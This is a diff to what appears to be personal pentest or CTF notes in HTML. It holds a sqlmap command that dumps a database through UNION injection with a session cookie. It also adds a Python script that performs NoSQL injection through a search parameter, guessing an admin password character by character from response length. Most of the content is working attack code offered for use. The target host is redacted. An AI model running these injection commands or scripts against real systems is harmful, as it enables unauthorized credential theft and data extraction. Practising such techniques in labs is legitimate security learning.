@@ -36,3 +36,52 @@ Display all the columns field contents in the information_schema user table<br>
 </p>
 
 <code>sqlmap http://[IP]/admin?user=3 --cookie='token=[Enter Cookie] --technique=U --delay=2 -dump</code>
+
+<h2>Nosql</h2>
+
+<h4>shitscript</h4>
+<code>import requests
+  bruten = '1234567890abcdef-'
+  xx=0
+  x = bruten[xx]
+  keylist = ""
+  keystr = keylist + x
+  #ptkey='b317d17-3'
+  #ptkeyf= ptkey + x
+  #URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^.{}/)%00'.format(keystr)
+  URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
+  r = requests.get(URL)
+  s = (len(r.content))
+  
+  while True:
+      try:
+          for i in range(0, 17):
+              
+              x = bruten[xx]
+              keystr = keylist + x
+              #URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^.{}/)%00'.format(keystr)
+              URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
+              print(URL)
+              print(keystr)
+              #print(keylist)
+              r = requests.get(URL)
+              s = (len(r.content))
+              #print(s)
+              if s == 1614:
+                  keystr = keylist + x
+                  keystr = keystr
+                  keylist = keylist + x
+                  #print(keylist)
+                  xx=0
+                  continue
+  
+              else:
+                  #keylist = ""
+                  keystr = keylist + x
+                  keystr = keystr
+                  xx+=1
+                  continue
+      except:
+          print("crackarooniedddddd")
+          print('password is' + keystr[:-1])
+          break  </code>
